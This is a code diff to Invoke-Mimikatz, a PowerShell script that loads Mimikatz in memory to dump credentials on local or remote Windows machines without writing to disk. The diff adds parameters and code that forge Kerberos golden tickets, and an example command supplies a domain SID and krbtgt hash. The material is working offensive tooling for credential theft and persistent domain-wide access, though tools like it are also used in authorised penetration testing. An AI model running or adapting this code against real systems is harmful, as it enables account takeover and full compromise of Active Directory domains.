@@ -19,6 +19,12 @@ Version: 1.5
 ReflectivePEInjection version: 1.1
 Mimikatz version: 2.0 alpha (2/16/2015)
 
+Update
+----------
+Date: 30 March 2015
+Author: Nikhil Sreekumar(@roo7break)
+Comment: Added support for mimikatz golden ticket generation
+
 .DESCRIPTION
 
 Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
@@ -39,7 +45,15 @@ Supply mimikatz a custom command line. This works exactly the same as running th
 .PARAMETER ComputerName
 
 Optional, an array of computernames to run the script on.
-	
+
+.PARAMETER GenTicket
+
+Switch: Use mimikatz to generate golden ticket with the variables provided with GenArgs.
+
+.PARAMETER GenArgs
+
+Supply required arguments, separated by ';' to generate ticket. To be used with GenTicket Only.
+
 .EXAMPLE
 
 Execute mimikatz on the local computer to dump certificates.
@@ -54,6 +68,11 @@ Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
 
 Execute mimikatz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
 Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
+
+.EXAMPLE
+
+Execute mimikatz on local computer to generate golden ticket
+Invoke-Mimikatz -GenTicket -GenArgs "/admin:administrator;/domain:choc.local;/sid:S-1-5-21-130452501-2365100805-3685010670;/krbtgt:310b643c5316c8c3c70a10cfb17e2e31;/ticket:choc.ekirbi"
 
 .NOTES
 This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
@@ -86,6 +105,14 @@ Param(
     [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
     [Switch]
     $DumpCerts,
+	
+	[Parameter(ParameterSetName = "GenTicket", Position = 1)]
+    [Switch]
+    $GenTicket,
+	
+	[Parameter(ParameterSetName = "GenArgs", Position = 1)]
+    [String]
+    $GenArgs,
 
     [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
     [String]
@@ -2707,6 +2734,18 @@ Function Main
     elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
     {
         $ExeArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
+    }
+	elseif ($PsCmdlet.ParameterSetName -ieq "GenTicket")
+    {
+        if ($GenArgs -ne "")
+		{
+			$GenArgs = $GenArgs.Split(';') -join ' '
+			$ExeArgs = "`"kerberos::golden $GenArgs`" exit"
+		}
+		else
+		{
+			Write-Verbose "GenArgs empty!. Check mimikatz documentation and provide required arguments (separated by ;)."
+		}
     }
     else
     {
